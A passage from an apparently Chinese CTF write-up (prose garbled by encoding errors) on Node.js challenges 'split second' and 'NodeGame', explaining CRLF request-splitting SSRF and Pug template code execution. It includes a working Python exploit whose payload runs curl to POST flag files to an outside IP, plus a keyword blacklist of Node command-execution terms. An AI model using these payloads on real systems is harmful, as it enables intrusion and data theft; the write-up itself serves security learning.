class="code"><pre><span class="line">app.get(<span class="string">'/flag'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> ip = req.connection.remoteAddress;</span><br><span class="line">    <span class="keyword">if</span> (ip.includes(<span class="string">'127.0.0.1'</span>)) &#123;</span><br><span class="line">        <span class="keyword">var</span> authheader = req.headers[<span class="string">'adminauth'</span>];</span><br><span class="line">        <span class="keyword">var</span> pug2 = <span class="built_in">decodeURI</span>(req.headers[<span class="string">'pug'</span>]);</span><br><span class="line">        <span class="keyword">var</span> x=pug2.match(<span class="regexp">/[a-z]/g</span>);</span><br><span class="line">        <span class="keyword">if</span>(!x)&#123;</span><br><span class="line">         <span class="keyword">if</span> (authheader === <span class="string">"secretpassword"</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> html = pug.render(pug2);</span><br><span class="line">         &#125;</span><br><span class="line">        &#125;</span><br><span class="line">       <span class="keyword">else</span>&#123;</span><br><span class="line">        res.send(<span class="string">"No characters"</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">     res.send(<span class="string">"You need to come from localhost"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>coreè·¯ç”±æ˜¯ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">app.get(<span class="string">'/core'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> q = req.query.q;</span><br><span class="line">    <span class="keyword">var</span> resp = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">if</span> (q) &#123;</span><br><span class="line">        <span class="keyword">var</span> url = <span class="string">'http://localhost:8081/getMeme?'</span> + q</span><br><span class="line">        <span class="built_in">console</span>.log(url)</span><br><span class="line">        <span class="keyword">var</span> trigger = blacklist(url);</span><br><span class="line">        <span class="keyword">if</span> (trigger === <span class="literal">true</span>) &#123;</span><br><span class="line">            res.send(<span class="string">"&lt;p&gt;Errrrr, You have been Blocked&lt;/p&gt;"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                http.get(url, <span class="function"><span class="keyword">function</span>(<span class="params">resp</span>) </span>&#123;</span><br><span class="line">                    resp.setEncoding(<span class="string">'utf8'</span>);</span><br><span class="line">                    resp.on(<span class="string">'error'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">err</span>) </span>&#123;</span><br><span class="line">                    <span class="keyword">if</span> (err.code === <span class="string">"ECONNRESET"</span>) &#123;</span><br><span class="line">                     <span class="built_in">console</span>.log(<span class="string">"Timeout occurs"</span>);</span><br><span class="line">                     <span class="keyword">return</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                   &#125;);</span><br><span class="line"></span><br><span class="line">                    resp.on(<span class="string">'data'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">chunk</span>) </span>&#123;</span><br><span class="line">                        resps = chunk.toString();</span><br><span class="line">                        res.send(resps);</span><br><span class="line">                    &#125;).on(<span class="string">'error'</span>, (e) =&gt; &#123;</span><br><span class="line">                         res.send(e.message);&#125;);</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">                <span class="built_in">console</span>.log(error);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.send(<span class="string">"search param 'q' missing!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>è¿˜æœ‰ä¸€ä¸ªé»‘åå•å‡½æ•°</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params">url</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> evilwords = [<span class="string">"global"</span>, <span class="string">"process"</span>,<span class="string">"mainModule"</span>,<span class="string">"require"</span>,<span class="string">"root"</span>,<span class="string">"child_process"</span>,<span class="string">"exec"</span>,<span class="string">"\""</span>,<span class="string">"'"</span>,<span class="string">"!"</span>];</span><br><span class="line">    <span class="keyword">var</span> arrayLen = evilwords.length;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; arrayLen; i++) &#123;</span><br><span class="line">        <span class="keyword">const</span> trigger = url.includes(evilwords[i]);</span><br><span class="line">        <span class="keyword">if</span> (trigger === <span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä»¥ä¸Šå°±æ˜¯æºç ä¸­é‡è¦éƒ¨åˆ†ã€‚é™¤æ­¤ä»¥å¤–è¿˜è¦å…ˆæ˜ç¡®ä¸€ç‚¹ï¼Œé¢˜ç›®ä½¿ç”¨çš„æ˜¯Nodejs8.12.ç‰ˆæœ¬ã€‚å¹¶ä¸”ä½¿ç”¨pugä½œä¸ºæ¨¡æ¿å¼•æ“ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="keyword">var</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>);</span><br><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</span><br><span class="line"><span class="keyword">var</span> pug = <span class="built_in">require</span>(<span class="string">'pug'</span>);</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªç‰ˆæœ¬çš„Nodejså­˜åœ¨ä»€ä¹ˆæ¼æ´å‘¢ï¼Ÿå¦‚æœå»æœç´¢ä¼šå‘ç°å­˜åœ¨ä¸€ä¸ªCVE,ç±»å‹ä¸ºCRLF injectionã€‚å…·ä½“åˆ©ç”¨ä¹‹åå†æã€‚ç°åœ¨æˆ‘ä»¬æ¥åˆ†æä¸‹ä¸Šè¿°æºç çš„é‡è¦ä¹‹å¤„ï¼š<br>1./flag è¿™æ˜¯æˆ‘ä»¬çš„æœ€ç»ˆç›®çš„ã€‚ä¸€ä¸ªé‡ç‚¹æ˜¯è¦è¾¾æˆ<code>ip.includes(&#39;127.0.0.1)</code>ã€‚è¯´æ˜æˆ‘ä»¬å¯èƒ½éœ€è¦æ„é€ ä¸€ä¸ªssrf.åœ¨ipæ£€æŸ¥åï¼Œè¿˜æœ‰å¦ä¸€ä¸ªæ¡ä»¶<code>authheader === &quot;secretpassword&quot;</code>è¿›è¡Œäº†httpå¤´çš„æ£€æŸ¥ï¼Œè¾¾æˆåå°†è¿›è¡Œ<code>pug</code>çš„æ¸²æŸ“ï¼Œè¯´æ˜å¯èƒ½è¾¾æˆNodejsçš„å‘½ä»¤æ‰§è¡Œã€‚è€Œæ—¢ç„¶è¦å¯¹å¤´è¿›è¡Œæ£€æŸ¥ï¼Œè¯´æ˜æˆ‘ä»¬ç¡®å®å¯èƒ½éœ€è¦CRLFæ¼æ´æ¥è¿›è¡Œhttpå¤´çš„ä¼ªé€ ã€‚</p><p>2.coreè·¯ç”±å…è®¸æˆ‘ä»¬ä¼ é€’å‚æ•°qã€‚ä¹‹åä¸<code>http://localhost:8081/getMeme?</code>æ‹¼æ¥ï¼Œæ•´ä¸ªurlç»è¿‡ä¸€æ¬¡é»‘åå•æ£€æŸ¥åå°†æ‰§è¡Œã€‚æ‰€ä»¥ä¸Šé¢æ‰€éœ€çš„ssrfåœ¨è¿™å·²ç»å¸®æˆ‘ä»¬å‡†å¤‡å¥½äº†ã€‚åªéœ€è€ƒè™‘ç»•è¿‡å³å¯</p><p>3.é»‘åå•<br>ä»å…¶ä¸­å­˜åœ¨çš„å…³é”®å­—å°±å¯çœ‹å‡ºï¼Œè¿™æ˜¯Nodejså¸¸è§çš„å‘½ä»¤æ‰§è¡Œçš„æ¨¡æ¿ã€‚æˆ‘ä»¬ä»¥å‰ç”¨è¿‡çš„Nodejså‘½ä»¤æ‰§è¡Œpayload:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">global.process.mainModule.require(<span class="string">'child_process'</span>).exec(<span class="string">'ls'</span>)</span><br></pre></td></tr></table></figure><p>å°†ä¸èƒ½ç›´æ¥ä¼ å…¥ã€‚æ˜¾ç„¶è¿™é‡Œéœ€è¦å…¶ä»–é€”å¾„æ¥ç¼–ç ç»•è¿‡ã€‚</p><p>æ—¢ç„¶å¦‚æ­¤æˆ‘ä»¬æ¥å¤ç°ä¸‹,vpsä¸Šæ­å¥½ç¯å¢ƒï¼š<br>æˆ‘ä»¬çš„CRLFæ¼æ´ï¼Œå…è®¸æˆ‘ä»¬é€šè¿‡æ¢è¡Œæ„é€ headersã€‚åŒæ—¶ä¹Ÿå¯ä»¥æ„é€ æ‹†åˆ†ssrfã€‚åˆ©ç”¨æ¢è¡Œç»“æŸå‰ä¸€ä¸ªè¯·æ±‚ï¼Œå¹¶å‘é€å¦ä¸€ä¸ªè¯·æ±‚ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;core?q&#x3D;x HTTP&#x2F;1.1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">GET &#x2F;flag HTTP&#x2F;1.1</span><br><span class="line">adminauth: secretpassword</span><br><span class="line">pug: - xxx</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆæ˜ç¡®æˆ‘ä»¬éœ€è¦ä¼ªé€ çš„æ–‡ä»¶å¤´</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;flag HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">adminauth: secretpassword</span><br><span class="line">pug: - code </span><br><span class="line">dummy:  HTTP&#x2F;1.1</span><br><span class="line">Host: localhost:8081</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p>pugå¤„å¯ä»¥æ‰§è¡Œæˆ‘ä»¬éœ€è¦æ‰§è¡Œçš„å‘½ä»¤ã€‚è€Œå…³é”®headersé‡Œçš„å‚æ•°å·²ç»ç»•è¿‡ã€‚æ—¢ç„¶å¦‚æ­¤ï¼Œå¯ä»¥å¤§è‡´å†™å‡ºæˆ‘ä»¬éœ€è¦ç”¨CRLFæ³¨å…¥çš„å‘½ä»¤payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SPACE+HTTP+%2F+1.1+CRLF+Host+%3A+SPACE+127.0.0.1+CRLF+CRLF+GET+SPACE+%2F+flag+SPACE+HTTP+%2F+1.1+CRLF+Host+%3A+SPACE+127.0.0.1+CRLF+adminauth+%3A+SPACE+secretpassword+CRLF+pug+%3A+SPACE+aaa+CRLF+dummy+%3A+SPACE</span><br></pre></td></tr></table></figure><p>è€Œåªéœ€<code>/core?q=payload</code>å°±æ‰§è¡Œäº†SSRF+CRLFã€‚</p><p>è€Œä¸ºäº†bypasså¯¹pugçš„æ¸²æŸ“é—®é¢˜ï¼Œæˆ‘ä»¬ç›´æ¥é€‰æ‹©8è¿›åˆ¶ç»•è¿‡ã€‚å› ä¸ºå®ƒä¸åƒunicodeæˆ–è€…16è¿›åˆ¶é‚£æ ·å®¹æ˜“åŒ…å«å­—æ¯ã€‚æ‰€ä»¥ä½¿ç”¨å…«è¿›åˆ¶ç»•è¿‡ã€‚å¤§æ¦‚å¦‚ä¸‹å½¢å¼ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[][<span class="string">"constructor"</span>]  æœ‰æ•ˆ</span><br><span class="line">[][<span class="string">"\143\157\156\163\164\162\165\143\164\157\162"</span>] æœ‰æ•ˆï¼Œå¯æ‰§è¡Œ</span><br><span class="line">[][\<span class="number">42</span>\<span class="number">143</span>\<span class="number">157</span>\<span class="number">156</span>\<span class="number">163</span>\<span class="number">164</span>\<span class="number">162</span>\<span class="number">165</span>\<span class="number">143</span>\<span class="number">164</span>\<span class="number">157</span>\<span class="number">162</span>\<span class="number">42</span>] æ— æ•ˆï¼Œå› ä¸ºåŒå¼•å·è¢«ç¼–ç äº†</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå‚ç…§dalaoçš„exp<br><a href="https://github.com/xiaobye-ctf/CTF-writeups/blob/master/hackim-2020/web/split%20second/split%20second.md" target="_blank" rel="noopener">https://github.com/xiaobye-ctf/CTF-writeups/blob/master/hackim-2020/web/split%20second/split%20second.md</a></p><p>(ç”¨çš„æ˜¯py2,æ‰€ä»¥ç”¨è™šæ‹Ÿæœºè·‘çš„æ‰æœ‰æ­£è§£):</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=UTF-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> requests.utils <span class="keyword">import</span> quote</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">toOct</span><span class="params">(str)</span>:</span></span><br><span class="line">r=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> str:</span><br><span class="line"><span class="keyword">if</span> i&gt;=<span class="string">'a'</span><span class="keyword">and</span> i&lt;=<span class="string">'z'</span>:</span><br><span class="line">r+=<span class="string">'\\'</span>+oct(ord(i))[<span class="number">1</span>:]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">r+=i</span><br><span class="line"><span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"><span class="comment">#This next line could test in nodejs interpreter so that we can observe the similar behavior about how http treat on unicode(\u&#123;xxxx&#125; is js encode pattern)</span></span><br><span class="line"><span class="comment">#Buffer.from('http://example.com/\u&#123;010D&#125;\u&#123;010A&#125;/test', 'latin1').toString()</span></span><br><span class="line"><span class="comment">#Unicode ÄÄŠ will convert to latin1 which will only pick up the right most byte</span></span><br><span class="line">SPACE=<span class="string">u'\u0120'</span>.encode(<span class="string">'utf-8'</span>)</span><br><span class="line">CRLF=<span class="string">u'\u010d\u010a'</span>.encode(<span class="string">'utf-8'</span>)  <span class="comment"># transfer from unicode to utf-8 (\uxxxx is unicode's pattern)</span></span><br><span class="line">SLASH=<span class="string">u'\u012f'</span>.encode(<span class="string">'utf-8'</span>)</span><br><span class="line"></span><br><span class="line">pug = toOct(<span class="string">'''-[]["constructor"]["constructor"]("console.log(this.process.mainModule.require('child_process').exec('curl 120.27.246.202:8888 -X POST -d $(cat fl*)'))")()'''</span>).replace(<span class="string">'"'</span>,<span class="string">'%22'</span>).replace(<span class="string">"'"</span>,<span class="string">"%27"</span>)<span class="comment">#' and " need to be double encoded</span></span><br><span class="line"><span class="keyword">print</span> quote(pug)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">'sol'</span>+SPACE+<span class="string">'HTTP'</span>+SLASH+<span class="string">'1.1'</span>+CRLF*<span class="number">2</span>+<span class="string">'GET'</span>+SPACE+SLASH+<span class="string">'flag'</span>+SPACE+<span class="string">'HTTP'</span>+SLASH+<span class="string">'1.1'</span>+CRLF+<span class="string">'x-forwarded-for:'</span>+SPACE+<span class="string">'127.0.0.1'</span>+CRLF+<span class="string">'adminauth:'</span>+SPACE+<span class="string">'secretpassword'</span>+CRLF+<span class="string">'pug:'</span>+SPACE+pug+CRLF+<span class="string">'test:'</span>+SPACE</span><br><span class="line"></span><br><span class="line">res=requests.get(<span class="string">'http://120.27.246.202:8081/core?q='</span>+quote(payload))</span><br><span class="line"><span class="comment">#res=requests.get('http://web2.ctf.nullcon.net:8081/core?q='+requote_uri(payload))</span></span><br><span class="line"><span class="keyword">print</span> res.content</span><br></pre></td></tr></table></figure><p>è„šæœ¬ä¸­æ³¨æ„ä¸€ä¸‹å‡ ç‚¹ï¼š<br>1.å•å¼•å·ä¸åŒå¼•å·å‡éœ€è¦ç¼–ç ä¸¤æ¬¡æ¥ç»•è¿‡é»‘åå•ã€‚<br>2.payloadæ‰§è¡Œæ—¶æ˜¯ç”¨<code>- code</code>çš„å½¢å¼æ‰§è¡Œçš„ã€‚è¿™æ˜¯pugçš„ç‰¹æ€§ã€‚è¿˜å¯ä»¥<code>#{}</code>ä½†æ˜¯è¢«è¿‡æ»¤äº†<br>åŒæ—¶è¿˜å­¦åˆ°äº†javascriptä¸­ç­‰ä»·çš„è¡¨è¾¾æ–¹å¼ï¼Œæ¯”å¦‚æ‰€å‚è€ƒçš„dalaoçš„payloadä¸­ç”¨åˆ°äº†</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[][<span class="string">'constructor'</span>][<span class="string">'constructor'</span>](<span class="string">'console.log(payload)'</span>)()</span><br></pre></td></tr></table></figure><p>ç­‰ä»·äº</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[].constructor.constructor(<span class="string">'alert(12345)'</span>)()</span><br></pre></td></tr></table></figure><p>ç­‰ä»·äº</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Array</span>.constructor(<span class="string">'alert(12345)'</span>)()</span><br></pre></td></tr></table></figure><p>ç›¸å½“äºå€Ÿç”¨äº†æ•°ç»„çš„æ„é€ æ–¹æ³•æ¥è°ƒç”¨å‘½ä»¤ã€‚<br><img src="/2020/02/26/%E5%8D%95%E7%8B%AC%E5%A1%AB%E5%9D%91-%E5%85%AC%E7%9B%8A%E8%B5%9BNodeGame/flag.PNG" class="lazyload" data-srcset="flag.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="flag"><br>å¥‡æ€ªçš„æ˜¯æˆ‘åˆæ²¡å¼¹åˆ°shellã€‚curlå‘½ä»¤åˆ°æ˜¯æ²¡å•¥é—®é¢˜</p><h1 id="NodeGame"><a href="#NodeGame" class="headerlink" title="NodeGame"></a>NodeGame</h1><p>å‡ºé¢˜äººæ€è·¯å¾ˆç®€å•ï¼Œæ—¢ç„¶è¿™ä¸ªCRLF+ssrfæ¼æ´å¯ä»¥æ„é€ headers,é‚£æ„é€ æ–‡ä»¶ä¸Šä¼ ä¹Ÿå¯ä»¥å–½ã€‚æ‰€ä»¥å°±æœ‰äº†è¿™ä¸ªé¢˜ç›®<br>å…ˆæ¥çœ‹ç»™çš„æºç </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="keyword">var</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>);</span><br><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</span><br><span class="line"><span class="keyword">var</span> pug = <span class="built_in">require</span>(<span class="string">'pug'</span>);</span><br><span class="line"><span class="keyword">var</span> morgan = <span class="built_in">require</span>(<span class="string">'morgan'</span>);</span><br><span class="line"><span class="keyword">const</span> multer = <span class="built_in">require</span>(<span class="string">'multer'</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.use(multer(&#123;<span class="attr">dest</span>: <span class="string">'./dist'</span>&#125;).array(<span class="string">'file'</span>));</span><br><span class="line">app.use(morgan(<span class="string">'short'</span>));</span><br><span class="line">app.use(<span class="string">"/uploads"</span>,express.static(path.join(__dirname, <span class="string">'/uploads'</span>)))</span><br><span class="line">app.use(<span class="string">"/template"</span>,express.static(path.join(__dirname, <span class="string">'/template'</span>)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> action = req.query.action?req.query.action:<span class="string">"index"</span>;</span><br><span class="line">    <span class="keyword">if</span>( action.includes(<span class="string">"/"</span>) || action.includes(<span class="string">"\\"</span>) )&#123;</span><br><span class="line">        res.send(<span class="string">"Errrrr, You have been Blocked"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    file = path.join(__dirname + <span class="string">'/template/'</span>+ action +<span class="string">'.pug'</span>);</span><br><span class="line">    <span class="keyword">var</span> html = pug.renderFile(file);</span><br><span class="line">    res.send(html);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">'/file_upload'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> ip = req.connection.remoteAddress;</span><br><span class="line">    <span class="keyword">var</span> obj = &#123;</span><br><span class="line">        msg: <span class="string">''</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!ip.includes(<span class="string">'127.0.0.1'</span>)) &#123;</span><br><span class="line">        obj.msg=<span class="string">"only admin's ip can use it"</span></span><br><span class="line">        res.send(<span class="built_in">JSON</span>.stringify(obj));</span><br><span class="line">        <span class="keyword">return</span> </span><br><span class="line">    &#125;</span><br><span class="line">    fs.readFile(req.files[<span class="number">0</span>].path, <span class="function"><span class="keyword">function</span>(<span class="params">err, data</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(err)&#123;</span><br><span class="line">            obj.msg = <span class="string">'upload failed'</span>;</span><br><span class="line">            res.send(<span class="built_in">JSON</span>.stringify(obj));</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">var</span> file_path = <span class="string">'/uploads/'</span> + req.files[<span class="number">0</span>].mimetype +<span class="string">"/"</span>;</span><br><span class="line">            <span class="keyword">var</span> file_name = req.files[<span class="number">0</span>].originalname</span><br><span class="line">            <span class="keyword">var</span> dir_file = __dirname + file_path + file_name</span><br><span class="line">            <span class="keyword">if</span>(!fs.existsSync(__dirname + file_path))&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    fs.mkdirSync(__dirname + file_path)</span><br><span class="line">                &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">                    obj.msg = <span class="string">"file type error"</span>;</span><br><span class="line">                    res.send(<span class="built_in">JSON</span>.stringify(obj));</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                fs.writeFileSync(dir_file,data)</span><br><span class="line">                obj = &#123;</span><br><span class="line">                    msg: <span class="string">'upload success'</span>,</span><br><span class="line">                    filename: file_path + file_name</span><br><span class="line">                &#125; </span><br><span class="line">            &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">                obj.msg = <span class="string">'upload failed'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            res.send(<span class="built_in">JSON</span>.stringify(obj));    </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/source'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    res.sendFile(path.join(__dirname + <span class="string">'/template/source.txt'</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/core'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> q = req.query.q;</span><br><span class="line">    <span class="keyword">var</span> resp = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">if</span> (q) &#123;</span><br><span class="line">        <span class="keyword">var</span> url = <span class="string">'http://localhost:8081/source?'</span> + q</span><br><span class="line">        <span class="built_in">console</span>.log(url)</span><br><span class="line">        <span class="keyword">var</span> trigger = blacklist(url);</span><br><span class="line">        <span class="keyword">if</span> (trigger === <span class="literal">true</span>) &#123;</span><br><span class="line">            res.send(<span class="string">"&lt;p&gt;error 